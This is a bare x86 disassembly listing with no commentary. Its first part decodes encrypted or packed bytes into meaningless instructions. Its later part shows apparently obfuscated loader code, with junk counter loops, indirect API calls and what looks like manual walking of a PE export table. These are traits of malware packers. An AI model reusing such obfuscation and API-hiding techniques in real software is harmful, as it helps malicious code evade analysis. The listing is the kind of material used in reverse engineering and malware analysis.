  40586a:	pop    es
  40586b:	sti    
  40586c:	push   ecx
  40586d:	mov    DWORD PTR [ebx+0x50],ebp
  405870:	or     DWORD PTR [ebx+edx*1],0x2e45537a
  405877:	or     DWORD PTR [esi+esi*8+0x78412f7c],esi
  40587e:	or     ebp,DWORD PTR [edi+0x39]
  405881:	or     bl,BYTE PTR [ecx]
  405883:	adc    eax,edx
  405885:	pop    edx
  405886:	lock push ebp
  405888:	lahf   
  405889:	pop    ds
  40588a:	dec    ebx
  40588b:	sbb    esp,DWORD PTR [ecx]
  40588d:	aaa    
  40588e:	push   esi
  40588f:	jg     0x40582d
  405891:	je     0x40587d
  405893:	mov    ds:0x10630791,eax
  405898:	sub    dh,BYTE PTR ds:0xc598c8b8
  40589e:	sbb    eax,0x77ed8be0
  4058a3:	jmp    0x5772:0xae048804
  4058aa:	lock xchg BYTE PTR [esi-0x7fc889bd],al
  4058b1:	mov    edx,0x564c5d9
  4058b6:	outs   dx,BYTE PTR ds:[esi]
  4058b7:	xor    DWORD PTR [edi+0x75040330],ebp
  4058bd:	mov    esi,ds
  4058bf:	sti    
  4058c0:	mov    dh,0x1f
  4058c2:	adc    DWORD PTR [eax-0x1d],ecx
  4058c5:	lahf   
  4058c6:	sbb    eax,0x8a09018f
  4058cb:	fld    QWORD PTR [edi+0x6d]
  4058ce:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058d0:	sbb    al,0xea
  4058d2:	mov    ds:0x5f730356,al
  4058d7:	stc    
  4058d8:	push   es
  4058d9:	pop    ss
  4058da:	mov    bl,0xa0
  4058dc:	mov    ebp,0x4a1757dc
  4058e1:	sub    al,0xc1
  4058e3:	hlt    
  4058e4:	mov    eax,0xb1f5b377
  4058e9:	into   
  4058ea:	add    DWORD PTR [ebx],ecx
  4058ec:	(bad)  
  4058ed:	jecxz  0x405886
  4058ef:	fwait
  4058f0:	xor    ah,dl
  4058f2:	in     al,0xa5
  4058f4:	loope  0x40591e
  4058f6:	pop    edi
  4058f7:	(bad)  
  4058f8:	bnd je 0x4058e5
  4058fb:	dec    esp
  4058fc:	repz bound ebp,QWORD PTR [edx-0x2235f1c0]
  405903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405904:	sbb    ch,bl
  405906:	cli    
  405907:	test   DWORD PTR [ebx],0x237efe26
  40590d:	enter  0x481d,0x84
  405911:	(bad)  
  405912:	sti    
  405913:	gs (bad) 
  405915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405916:	push   0x79683510
  40591b:	fimul  DWORD PTR [eax]
  40591d:	test   BYTE PTR [edi+ebp*8],ch
  405920:	leave  
  405921:	(bad)  
  405922:	jmp    0x4058aa
  405924:	sub    bl,BYTE PTR [edx]
  405926:	jno    0x40591e
  405928:	mov    bh,bl
  40592a:	mov    dl,0x30
  40592c:	imul   al
  40592e:	ret    0x3848
  405931:	or     eax,DWORD PTR [edi+0x3f726ad6]
  405937:	mov    esi,0xc5547c93
  40593c:	pop    ebp
  40593d:	adc    eax,0x263da4c9
  405942:	mov    ecx,0xab55300f
  405947:	pop    ds
  405948:	clc    
  405949:	fucom  st(5)
  40594b:	push   0x20993fe5
  405950:	int    0x6a
  405952:	mov    edx,0xa21780aa
  405957:	jbe    0x40594e
  405959:	push   ds
  40595a:	pushf  
  40595b:	and    cl,0x15
  40595e:	xchg   DWORD PTR [ecx],esp
  405960:	das    
  405961:	jle    0x405968
  405963:	mov    ebp,0x989dd252
  405968:	addr16 cwde 
  40596a:	iret   
  40596b:	xchg   esp,eax
  40596c:	(bad)  
  40596d:	push   ebx
  40596e:	adc    al,cl
  405970:	lods   eax,DWORD PTR ds:[esi]
  405971:	mov    edi,0x41e4856
  405976:	call   0x3cc12bd0
  40597b:	ds push ss
  40597d:	cmp    ebp,esi
  40597f:	jbe    0x4059f4
  405981:	and    eax,edi
  405983:	adc    ah,ah
  405985:	jp     0x405a01
  405987:	adc    al,BYTE PTR [edi]
  405989:	popa   
  40598a:	out    0x93,al
  40598c:	ss out dx,eax
  40598e:	adc    DWORD PTR [ecx+ebp*8],esi
  405991:	xor    eax,0xe0439280
  405996:	stos   DWORD PTR es:[edi],eax
  405997:	mov    cl,0x1f
  405999:	cdq    
  40599a:	test   DWORD PTR [edx],esi
  40599c:	aas    
  40599d:	add    eax,0xdfdc2656
  4059a2:	push   0x5061f90e
  4059a7:	xchg   edi,eax
  4059a8:	xchg   esp,eax
  4059a9:	adc    DWORD PTR [eax-0x36ec43e4],edx
  4059af:	sub    al,0xb5
  4059b1:	jmp    0x405968
  4059b3:	or     ah,BYTE PTR [ebx+edx*4-0x1a8c3766]
  4059ba:	xor    BYTE PTR [eax],ch
  4059bc:	popf   
  4059bd:	sti    
  4059be:	js     0x4059ed
  4059c0:	jmp    0xe523589c
  4059c5:	lock push ebx
  4059c7:	stos   DWORD PTR es:[edi],eax
  4059c8:	or     BYTE PTR [esi],dh
  4059ca:	jno    0x405957
  4059cc:	jo     0x405a3d
  4059ce:	dec    esp
  4059cf:	mov    al,0xa1
  4059d1:	mov    ebp,0x9afb0eb6
  4059d6:	in     eax,dx
  4059d7:	lea    edx,ds:0x66a7dceb
  4059dd:	push   ebp
  4059de:	in     eax,0x6c
  4059e0:	mov    edi,0x1bb2d817
  4059e5:	pop    ecx
  4059e6:	retf   
  4059e7:	sub    cl,BYTE PTR [ebp+0x67bc69ad]
  4059ed:	adc    al,0x1b
  4059ef:	test   ah,ch
  4059f1:	dec    edx
  4059f2:	pop    ss
  4059f3:	pop    ecx
  4059f4:	xchg   ebx,eax
  4059f5:	scas   al,BYTE PTR es:[edi]
  4059f6:	(bad)  
  4059f7:	push   cs
  4059f8:	cs jo  0x4059d8
  4059fb:	mov    eax,0xcc52b572
  405a00:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  405a02:	xchg   ecx,eax
  405a03:	fdiv   QWORD PTR [ebx-0x3115639c]
  405a09:	or     BYTE PTR [esi+0x6e],ah
  405a0c:	push   ds
  405a0d:	pop    esi
  405a0e:	sub    BYTE PTR [eax+0x61],ch
  405a11:	jnp    0x405a2e
  405a13:	test   BYTE PTR [ecx],dh
  405a15:	sti    
  405a16:	xchg   bl,ch
  405a18:	push   ebx
  405a19:	mov    esi,0xa39fc18d
  405a1e:	dec    eax
  405a1f:	jns    0x405a83
  405a21:	lds    ebp,FWORD PTR [ecx+0x569890e2]
  405a27:	xchg   esp,ecx
  405a29:	sub    bl,dh
  405a2b:	sub    eax,0x5d6549e2
  405a30:	enter  0xa414,0x43
  405a34:	je     0x4059f6
  405a36:	pop    ebp
  405a37:	(bad)  
  405a39:	xchg   edi,eax
  405a3a:	add    eax,DWORD PTR [ebp-0x16]
  405a3d:	call   0xa5927561
  405a42:	mov    ah,0x61
  405a44:	jns    0x405a1c
  405a46:	mov    ch,0x62
  405a48:	push   esi
  405a49:	push   esi
  405a4a:	in     al,0xab
  405a4c:	cmp    ch,BYTE PTR [ebp+0x17d9fa5]
  405a52:	mov    edi,0x8a4096d6
  405a57:	scas   al,BYTE PTR es:[edi]
  405a58:	push   es
  405a59:	push   edx
  405a5a:	mov    eax,ds:0x9e8cca20
  405a5f:	mov    dh,0x72
  405a61:	scas   eax,DWORD PTR es:[edi]
  405a62:	stos   DWORD PTR es:[edi],eax
  405a63:	or     ebx,DWORD PTR [edi]
  405a65:	dec    edi
  405a66:	mov    edi,0x58129897
  405a6b:	push   edi
  405a6c:	(bad)  
  405a6d:	lds    esi,FWORD PTR [esi]
  405a6f:	repnz dec edi
  405a71:	daa    
  405a72:	lea    ebp,[edi+0x2a80cc36]
  405a78:	mov    ecx,0x576fa112
  405a7d:	aad    0xb9
  405a7f:	jg     0x405a3c
  405a81:	jo     0x405a66
  405a83:	lock repz dec eax
  405a86:	jnp    0x405a7d
  405a88:	loopne 0x405a93
  405a8a:	or     ecx,DWORD PTR [esi+0x581e2d79]
  405a90:	push   0x36f953b0
  405a95:	pop    esi
  405a96:	shl    BYTE PTR [edi-0x48],1
  405a99:	scas   al,BYTE PTR es:[edi]
  405a9a:	push   ss
  405a9b:	adc    esp,0xd614572
  405aa1:	xor    ebx,DWORD PTR [edx]
  405aa3:	out    0xb4,eax
  405aa5:	fs jne 0x405a96
  405aa8:	ds mov ecx,0x313d3526
  405aae:	int    0xaf
  405ab0:	ins    BYTE PTR es:[edi],dx
  405ab1:	in     eax,0xc
  405ab3:	(bad)  
  405ab5:	and    ch,BYTE PTR ds:0x313bcf16
  405abb:	pusha  
  405abc:	jne    0x405b0c
  405abe:	fldcw  WORD PTR [ebp-0x2b463c7e]
  405ac4:	icebp  
  405ac5:	jmp    0xf472822b
  405aca:	arpl   di,ax
  405acc:	inc    edx
  405acd:	push   ecx
  405ace:	inc    esp
  405acf:	jl     0x405b4d
  405ad1:	cli    
  405ad2:	push   0xb845f3f9
  405ad7:	cdq    
  405ad8:	mov    esi,0xd3d2abab
  405add:	jb     0x405aad
  405adf:	inc    esp
  405ae0:	sub    al,0x92
  405ae2:	enter  0xf3d0,0x59
  405ae6:	out    0x75,eax
  405ae8:	loope  0x405a6c
  405aea:	xchg   edi,ebp
  405aec:	inc    edi
  405aed:	pop    es
  405aee:	push   edi
  405aef:	pop    ds
  405af0:	sbb    bl,BYTE PTR [ebp+0xc]
  405af3:	xor    ch,dl
  405af5:	fistp  DWORD PTR [edx]
  405af7:	imul   eax,DWORD PTR [ebp-0x21a05f33],0x9367ddcf
  405b01:	nop    DWORD PTR [ecx]
  405b04:	popa   
  405b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b06:	xchg   edi,eax
  405b07:	or     edx,DWORD PTR ds:0xaa125b26
  405b0d:	xchg   ebx,eax
  405b0e:	mov    esp,0xdebf5afb
  405b13:	imul   BYTE PTR [eax+0x5d]
  405b16:	mov    BYTE PTR [edi+ebp*8+0x76],bh
  405b1a:	xchg   edx,eax
  405b1b:	pop    eax
  405b1c:	mov    ah,0x13
  405b1e:	stc    
  405b1f:	sti    
  405b20:	xlat   BYTE PTR ds:[ebx]
  405b21:	rol    DWORD PTR ds:0xe8d47be7,cl
  405b27:	aaa    
  405b28:	fdiv   st(5),st
  405b2a:	test   al,0x49
  405b2c:	cli    
  405b2d:	mov    ecx,0x2a836af2
  405b32:	idiv   ah
  405b34:	xor    BYTE PTR [edi],0x73
  405b37:	dec    edx
  405b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b39:	or     eax,0x12cd7ae8
  405b3e:	pop    eax
  405b3f:	mov    dh,0xf3
  405b41:	mov    ebp,0x8727081a
  405b46:	xchg   esi,eax
  405b47:	push   esi
  405b48:	mov    ecx,0x8380dbfe
  405b4d:	retf   0x7f43
  405b50:	mov    al,ds:0x2697497b
  405b55:	sbb    esi,DWORD PTR [edi+ebx*8+0x6714ed27]
  405b5c:	add    BYTE PTR [edx-0x12abce25],cl
  405b62:	push   edx
  405b63:	sub    eax,edi
  405b65:	push   esi
  405b66:	rcr    DWORD PTR [edi],0x5d
  405b69:	push   esi
  405b6a:	jae    0x405b41
  405b6c:	imul   esi,edx,0x94361a5d
  405b72:	jp     0x405bf2
  405b74:	shl    DWORD PTR [edi+0x32],cl
  405b77:	mul    ebp
  405b79:	sub    dl,BYTE PTR [ecx]
  405b7b:	pop    ds
  405b7c:	cli    
  405b7d:	neg    BYTE PTR cs:[edi-0x53]
  405b81:	stos   DWORD PTR es:[edi],eax
  405b82:	pop    ebx
  405b83:	push   esi
  405b84:	fcmovbe st,st(7)
  405b86:	stc    
  405b87:	mov    bh,BYTE PTR [edx-0x7f]
  405b8a:	mov    dl,0xa0
  405b8c:	mov    al,0x33
  405b8e:	(bad)  [edx]
  405b90:	fcomp  DWORD PTR [ecx-0x22]
  405b93:	fistp  QWORD PTR [ecx]
  405b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b96:	out    0xfe,al
  405b98:	aad    0xc8
  405b9a:	sar    esi,cl
  405b9c:	aas    
  405b9d:	xchg   ecx,eax
  405b9e:	or     eax,DWORD PTR [ebx+0x727afe0b]
  405ba4:	repnz shl DWORD PTR [esi+ebp*8],1
  405ba8:	lds    ecx,FWORD PTR [eax+0x6f]
  405bab:	xchg   esp,eax
  405bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bad:	jge    0x405bd1
  405baf:	mov    ds:0xef625c0d,al
  405bb4:	cli    
  405bb5:	jnp    0x405b86
  405bb7:	lahf   
  405bb8:	xchg   ebx,eax
  405bb9:	pop    ss
  405bba:	jl     0x405b78
  405bbc:	jb     0x405b98
  405bbe:	jge    0x405bca
  405bc0:	outs   dx,DWORD PTR ds:[esi]
  405bc1:	nop
  405bc2:	pusha  
  405bc3:	adc    eax,0x4480183d
  405bc8:	dec    esi
  405bc9:	loop   0x405bc4
  405bcb:	imul   ebx,esi,0x5a2f75ca
  405bd1:	ds push ebp
  405bd3:	mov    esi,eax
  405bd5:	adc    DWORD PTR [eax+0x0],esp
  405bd8:	add    WORD PTR [ebp-0x17f29cf4],0x64
  405be0:	nop
  405be1:	jge    0x405be0
  405be3:	push   0x5f
  405be5:	adc    ecx,DWORD PTR [ecx]
  405be7:	fsub   DWORD PTR [esi]
  405be9:	jnp    0x405b9c
  405beb:	adc    BYTE PTR [ebx-0xc0ace3a],cl
  405bf1:	xchg   edx,eax
  405bf2:	ja     0x405c52
  405bf4:	rcr    BYTE PTR [ebx+0x66],1
  405bf7:	fdiv   QWORD PTR [edi+0x46]
  405bfa:	mov    cl,0x1b
  405bfc:	adc    BYTE PTR [edx+eax*1-0x3bace856],cl
  405c03:	jmp    0x405bc0
  405c05:	cmp    al,0x4e
  405c07:	sub    al,0xd1
  405c09:	imul   ecx,esp,0x3c
  405c0c:	or     BYTE PTR [ecx-0x54],ah
  405c0f:	xor    esp,DWORD PTR [ebx+edx*4-0x4d]
  405c13:	mul    DWORD PTR [edi-0x68]
  405c16:	mov    ds:0xa27636b7,al
  405c1b:	pushf  
  405c1c:	fldcw  WORD PTR [eax+0x69]
  405c1f:	mov    ah,0x34
  405c21:	aam    0xc0
  405c23:	addr16 mov es,eax
  405c26:	add    DWORD PTR [esi+esi*1-0x5d],0xfc775002
  405c2e:	js     0x405c4c
  405c30:	addr16 pop esp
  405c32:	aaa    
  405c33:	sbb    ah,bh
  405c35:	aad    0x93
  405c37:	mov    esp,0xfbaccd0f
  405c3c:	outs   dx,DWORD PTR ds:[esi]
  405c3d:	(bad)  
  405c3e:	loope  0x405c3e
  405c40:	scas   al,BYTE PTR es:[edi]
  405c41:	mov    ds:0x64399637,al
  405c46:	imul   esi,DWORD PTR [edx-0x2d5ed1fb],0xff00421a
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421d2e
  405c57:	push   DWORD PTR ds:0x421ada
  405c5d:	push   DWORD PTR ds:0x421d0e
  405c63:	push   DWORD PTR ds:0x421da2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421cd2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423837
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x4237f6
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a62
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423982
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
